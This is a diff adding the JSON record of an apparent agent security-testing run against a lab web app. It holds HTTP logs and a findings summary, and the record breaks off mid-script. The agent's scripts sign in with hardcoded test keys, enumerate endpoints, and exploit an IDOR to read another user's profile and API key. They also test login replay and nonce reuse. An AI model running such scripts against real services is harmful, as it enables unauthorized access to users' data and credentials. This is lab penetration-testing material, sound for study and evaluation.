+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "91",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"5b-jP3Zc/mQMAlIUwJG2oqs6zUxiwg\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "id": 1,
+              "wallet": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
+              "apiKey": "tk_alice_9f1c4a2e"
+            }
+          }
+        },
+        {
+          "label": "10. GET /api/users/2/wallet",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/users/2/wallet",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 200,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "89",
+              "content-type": "application/json; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "etag": "W/\"59-LbOwEeRdCnrHFyJZ5kZUWG+TFcw\"",
+              "keep-alive": "timeout=5",
+              "x-powered-by": "Express"
+            },
+            "body": {
+              "id": 2,
+              "wallet": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+              "apiKey": "tk_bob_77ab0e31"
+            }
+          }
+        },
+        {
+          "label": "11. GET /openapi.json",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/openapi.json",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "151",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /openapi.json</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "12. GET /api/users",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/users",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "148",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/users</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "13. GET /api/admin",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/admin",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "148",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/admin</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "14. GET /health",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/health",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "145",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /health</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "15. GET /api/keys",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/keys",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "147",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/keys</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "16. GET /api/me/wallet",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/me/wallet",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "152",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/me/wallet</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "17. GET /api/tokens",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/tokens",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "149",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/tokens</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "18. GET /debug",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/debug",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "144",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /debug</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "19. GET /api/config",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/api/config",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "149",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /api/config</pre>\n</body>\n</html>\n"
+          }
+        },
+        {
+          "label": "20. GET /status",
+          "request": {
+            "method": "GET",
+            "url": "http://lab:8080/status",
+            "headers": {
+              "content-type": "application/json",
+              "authorization": "Bearer 8cc62d3152d1e6301e5bbd1a14927e6316bd3bb8f31da7b0"
+            },
+            "body": null
+          },
+          "response": {
+            "status": 404,
+            "headers": {
+              "connection": "keep-alive",
+              "content-length": "145",
+              "content-security-policy": "default-src 'none'",
+              "content-type": "text/html; charset=utf-8",
+              "date": "Tue, 10 Nov 2026 21:10:52 GMT",
+              "keep-alive": "timeout=5",
+              "x-content-type-options": "nosniff",
+              "x-powered-by": "Express"
+            },
+            "body": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /status</pre>\n</body>\n</html>\n"
+          }
+        }
+      ]
+    },
+    "decision": "approved",
+    "recorded": true,
+    "calls": [
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "submit_finding",
+      "run_request_script",
+      "submit_finding",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script",
+      "run_request_script"
+    ],
+    "final": "Budget is exhausted (12/12 runs used) and all three unsubmitted matches (`wallet-idor-isolated`, `token-quirks-1`, `header-trust-1`) are the same root cause already recorded as finding #1, so there is nothing new to submit.\n\n## Coverage summary\n\n| # | Suspect | Result |\n|---|---|---|\n| 1 | `/api/users/{id}` — any session reads any user's profile (name, e-mail, wallet, balance) | **proven** — finding #1 |\n| 2 | `/api/users/{id}/wallet` — same handler family, leaks the victim's `apiKey` | **proven** — same root cause as #1 (engine confirmed duplicate 3x) |\n| 3 | `/siwe/verify` replay: identical `message`+`signature` re-posted, re-posted after a fresh nonce, nonce reused across two message texts | **not proven** — accepted and minted a new token each time, but no engine harm check fired in 4 attempts (also could not confirm in the last run whether the replayed token stays usable — budget ran out) |\n| 4 | `issuedAt` / `expirationTime` not enforced (a 2020 message verified fine) | **not proven** — accepted, but too weak on its own to trip a check |\n| 5 | Signature not bound to the `address` in the message (alice's key signing bob's address) | **not exploitable** — `401 signature verific",
+    "usage": {
+      "usd": 0.021988079999999997,
+      "models": {
+        "boundless/deepseek-v4.1-flash-abliterated": {
+          "in": 1009,
+          "out": 22652,
+          "reasoning": 11368
+        }
+      }
+    },
+    "reports": []
+  },
+  "transcript": {
+    "calls": [
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "recon-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst BK = \"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\";\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = JSON.parse(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return JSON.parse(v.resBody);\n}\nconst a = await login(A, AK);\nconst b = await login(B, BK);\nconst at = { authorization: \"Bearer \" + a.token };\nconst out = { aliceTok: a.token, bobTok: b.token, aliceUser: a.user, bobUser: b.user };\nout.meA = await request(\"GET\", \"/api/me\", { headers: at });\nout.u1 = await request(\"GET\", \"/api/users/1\", { headers: at });\nout.u2 = await request(\"GET\", \"/api/users/2\", { headers: at });\nout.w2 = await request(\"GET\", \"/api/users/2/wallet\", { headers: at });\nout.w1 = await request(\"GET\", \"/api/users/1/wallet\", { headers: at });\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/api/health\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/debug\",\"/siwe/token\",\"/api/sessions\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { status: r.status, body: String(r.resBody).slice(0,200) }; }\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "recon-2",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst BK = \"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = J(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return { status: v.status, data: J(v.resBody) };\n}\nconst a = await login(A, AK);\nconst b = await login(B, BK);\nconst out = { aStatus: a.status, bStatus: b.status, aliceTok: a.data.token, bobTok: b.data.token, aliceUser: a.data.user, bobUser: b.data.user };\nif (!a.data.token) return out;\nconst at = { authorization: \"Bearer \" + a.data.token };\nout.meA = (await request(\"GET\", \"/api/me\", { headers: at })).resBody;\nout.u1 = (await request(\"GET\", \"/api/users/1\", { headers: at })).resBody;\nout.u2 = (await request(\"GET\", \"/api/users/2\", { headers: at })).resBody;\nout.w2 = (await request(\"GET\", \"/api/users/2/wallet\", { headers: at })).resBody;\nout.w1 = (await request(\"GET\", \"/api/users/1/wallet\", { headers: at })).resBody;\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/api/health\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/debug\",\"/siwe/token\",\"/api/sessions\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0,160) }; }\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "recon-3",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nasync function login(addr, key) {\n  const n = await request(\"GET\", \"/siwe/nonce\");\n  const nonce = J(n.resBody).nonce;\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: addr, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\n  const sig = await signPersonal(key, msg);\n  const v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\n  return { s: v.status, d: J(v.resBody) };\n}\nconst a = await login(A, AK);\nconst at = { authorization: \"Bearer \" + a.d.token };\nconst out = {};\nout.a = a;\nconst cands = [\"0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b786900\",\n               \"0x059c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690\"];\nout.bobs = [];\nfor (const k of cands) {\n  try { const r = await login(B, k); out.bobs.push({ k, s: r.s, u: r.d.user, tok: r.d.token }); } catch (e) { out.bobs.push({ k, err: String(e).slice(0,80) }); }\n}\nout.meA = (await request(\"GET\", \"/api/me\", { headers: at })).resBody;\nout.u2 = (await request(\"GET\", \"/api/users/2\", { headers: at })).resBody;\nout.w1 = (await request(\"GET\", \"/api/users/1/wallet\", { headers: at })).resBody;\nout.w2 = (await request(\"GET\", \"/api/users/2/wallet\", { headers: at })).resBody;\nconst probes = [\"/openapi.json\",\"/api/users\",\"/api/admin\",\"/health\",\"/api/keys\",\"/api/me/wallet\",\"/api/tokens\",\"/debug\",\"/api/config\",\"/status\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0,160) }; }\nreturn out;"
+        }
+      },
+      {
+        "name": "submit_finding",
+        "args": {
+          "title": "Broken object level authorization on /api/users/{id}: any session reads any user's profile",
+          "severity": "high",
+          "label": "recon-3",
+          "explanation": "I signed in as alice (user id 1) and got a normal bearer token. Then I called `GET /api/users/2` with alice's token. The server sent back bob's private profile: his name, his e-mail `bob@touchstone.lab`, his wallet address, and his balance.\n\nThe server only checks that *some* session exists. It never checks that the session owns the `id` in the path. So one account can walk id 1, 2, 3... and read everybody's data with no other help.\n\n```js\nconst a = await login(alice);                     // token for user 1\nawait request(\"GET\", \"/api/users/2\", { headers: { authorization: \"Bearer \" + a.token } });\n// 200 {\"id\":2,\"name\":\"bob\",\"email\":\"bob@touchstone.lab\",\"balanceUsd\":900}\n```\n\nFix: in the `/api/users/{id}` handler, compare the path `id` with the session user id. Return 403 when they differ, or return only the fields that are public."
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "wallet-idor-isolated",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: J(n.resBody).nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\nconst tok = J(v.resBody).token;\nconst r = await request(\"GET\", \"/api/users/2/wallet\", { headers: { authorization: \"Bearer \" + tok } });\nreturn { me: J(v.resBody).user, bobWallet: r.resBody };"
+        }
+      },
+      {
+        "name": "submit_finding",
+        "args": {
+          "title": "/api/users/{id}/wallet leaks another user's API key to any session",
+          "severity": "high",
+          "label": "wallet-idor-isolated",
+          "explanation": "The wallet route has the same missing check as the profile route. A session for user 1 can ask for user 2's wallet and gets bob's `apiKey` back. An API key is a credential. So a single alice session also collects bob's key material, not only his e-mail.\n\n```js\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: alice, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: (await ...).nonce, issuedAt: new Date().toISOString() });\n// ... verify -> alice token ...\nawait request(\"GET\", \"/api/users/2/wallet\", { headers: { authorization: \"Bearer \" + aliceToken } });\n// 200 {\"id\":2,\"wallet\":\"0x7099...79C8\",\"apiKey\":\"tk_bob_77ab0e31\"}\n```\n\nNote that the key itself is guessable: `tk_bob_` + 8 hex chars. That makes the leak worse, because a stolen or guessed key is easy to read back.\n\nFix: in the `/api/users/{id}/wallet` handler, compare the path `id` with the session user id, or split the route into `/api/me/wallet` and a public route that hides `apiKey`."
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "replay-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst nonce = J(n.resBody).nonce;\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst body = JSON.stringify({ message: msg, signature: sig });\nconst h = { \"content-type\": \"application/json\" };\nconst v1 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nconst v2 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nawait request(\"GET\", \"/siwe/nonce\");\nconst v3 = await request(\"POST\", \"/siwe/verify\", { headers: h, body });\nreturn { nonce, v1: { s: v1.status, b: J(v1.resBody) }, v2: { s: v2.status, b: J(v2.resBody) }, v3: { s: v3.status, b: J(v3.resBody) } };"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "siwe-fields-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst h = { \"content-type\": \"application/json\" };\nconst out = {};\nasync function tryVerify(tag, fields) {\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, issuedAt: new Date().toISOString(), ...fields });\n  const sig = await signPersonal(AK, msg);\n  const r = await request(\"POST\", \"/siwe/verify\", { headers: h, body: JSON.stringify({ message: msg, signature: sig }) });\n  out[tag] = { s: r.status, b: J(r.resBody) };\n}\nconst fresh = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"inventedNonce\", { nonce: \"deadbeefdeadbeef\" });\nawait tryVerify(\"evildomain\", { nonce: fresh, domain: \"evil.lab\" });\nconst fresh2 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"eviluri\", { nonce: fresh2, uri: \"http://evil.lab/x\" });\nconst fresh3 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"wrongchain\", { nonce: fresh3, chainId: 1 });\nconst fresh4 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nawait tryVerify(\"oldIssuedAt\", { nonce: fresh4, issuedAt: \"2020-01-01T00:00:00.000Z\" });\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "nonce-reuse-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst h = { \"content-type\": \"application/json\" };\nconst out = {};\nconst nonce = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nfor (let i = 0; i < 2; i++) {\n  const msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce, issuedAt: new Date(Date.now() + i * 1000).toISOString() });\n  const sig = await signPersonal(AK, msg);\n  const r = await request(\"POST\", \"/siwe/verify\", { headers: h, body: JSON.stringify({ message: msg, signature: sig }) });\n  out[\"nonceReuse\" + i] = { s: r.status, b: J(r.resBody) };\n}\nconst tok = out.nonceReuse0.b && out.nonceReuse0.b.token;\nout.unauth = {};\nfor (const p of [\"/api/me\", \"/api/users/1\", \"/api/users/1/wallet\"]) {\n  const r = await request(\"GET\", p); out.unauth[p] = { s: r.status, b: String(r.resBody).slice(0, 120) };\n}\nout.badToken = (await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer nope\" } })).status;\nif (tok) {\n  const at = { authorization: \"Bearer \" + tok };\n  const probes = [\"/api/users/1/sessions\",\"/api/sessions\",\"/api/me/sessions\",\"/api/apikey\",\"/api/users/1/apikey\",\"/api/wallet\",\"/api/transactions\",\"/api/users/1/transactions\",\"/api/export\",\"/metrics\",\"/api/v1/users/1\",\"/v1/users/1\",\"/api/internal\",\"/api/users/1/key\",\"/api/users/1/privatekey\",\"/nonce\",\"/api/nonce\",\"/api/admin/users\"];\n  out.probes = {};\n  for (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: String(r.resBody).slice(0, 110) }; }\n}\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "enum-2",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst n = await request(\"GET\", \"/siwe/nonce\");\nconst msg = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: J(n.resBody).nonce, issuedAt: new Date().toISOString() });\nconst sig = await signPersonal(AK, msg);\nconst v = await request(\"POST\", \"/siwe/verify\", { headers: { \"content-type\": \"application/json\" }, body: JSON.stringify({ message: msg, signature: sig }) });\nconst at = { authorization: \"Bearer \" + J(v.resBody).token };\nconst bobKey = \"tk_bob_77ab0e31\";\nconst out = {};\nout.apiKeyAuth = {\n  xApiKey: (await request(\"GET\", \"/api/me\", { headers: { \"x-api-key\": bobKey } })).resBody,\n  bearer: (await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer \" + bobKey } })).resBody,\n  query: (await request(\"GET\", \"/api/me?apiKey=\" + bobKey)).resBody,\n  query2: (await request(\"GET\", \"/api/users/2/wallet?apiKey=\" + bobKey)).resBody\n};\nout.opt = (await request(\"OPTIONS\", \"/api/users/1/wallet\", { headers: at })).resHeaders;\nout.methods = {\n  post: (await request(\"POST\", \"/api/users/1/wallet\", { headers: at })).status,\n  put: (await request(\"PUT\", \"/api/users/1/wallet\", { headers: at })).status,\n  del: (await request(\"DELETE\", \"/api/users/1/wallet\", { headers: at })).status\n};\nconst probes = [\"/api/users/me\",\"/api/users/0\",\"/api/users/1/keys\",\"/api/users/1/export\",\"/api/export/wallet\",\"/api/me/export\",\"/api/profile\",\"/api/settings\",\"/api/token\",\"/api/users/1/token\",\"/api/ping\",\"/api/version\",\"/api/flags\",\"/siwe/session\",\"/siwe/me\",\"/docs\",\"/swagger.json\",\"/api-docs\",\"/routes\",\"/.well-known/openapi.json\"];\nout.probes = {};\nfor (const p of probes) { const r = await request(\"GET\", p, { headers: at }); out.probes[p] = { s: r.status, b: r.status === 200 ? String(r.resBody).slice(0, 130) : \"\" }; }\nreturn out;"
+        }
+      },
+      {
+        "name": "run_request_script",
+        "args": {
+          "label": "address-binding-1",
+          "script": "const A = \"0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\";\nconst AK = \"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\";\nconst B = \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\";\nconst J = (x) => typeof x === \"string\" ? JSON.parse(x) : x;\nconst h = { \"content-type\": \"application/json\" };\nconst out = {};\nconst n1 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nconst m1 = buildSiwe({ domain: \"touchstone.lab\", address: A, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: n1, issuedAt: new Date().toISOString() });\nconst s1 = await signPersonal(AK, m1);\nout.control = J((await request(\"POST\", \"/siwe/verify\", { headers: h, body: JSON.stringify({ message: m1, signature: s1 }) })).resBody);\nconst n2 = J((await request(\"GET\", \"/siwe/nonce\")).resBody).nonce;\nconst m2 = buildSiwe({ domain: \"touchstone.lab\", address: B, uri: \"http://touchstone.lab/siwe\", version: \"1\", chainId: 31337, nonce: n2, issuedAt: new Date().toISOString() });\nconst s2 = await signPersonal(AK, m2);\nconst v2 = await request(\"POST\", \"/siwe/verify\", { headers: h, body: JSON.stringify({ message: m2, signature: s2 }) });\nout.forgedAsBob = { s: v2.status, b: J(v2.resBody) };\nif (out.forgedAsBob.b && out.forgedAsBob.b.token) {\n  out.forgedMe = (await request(\"GET\", \"/api/me\", { headers: { authorization: \"Bearer \" + out.forgedAsBob.b.token } })).resBody;\n}\nconst probes = 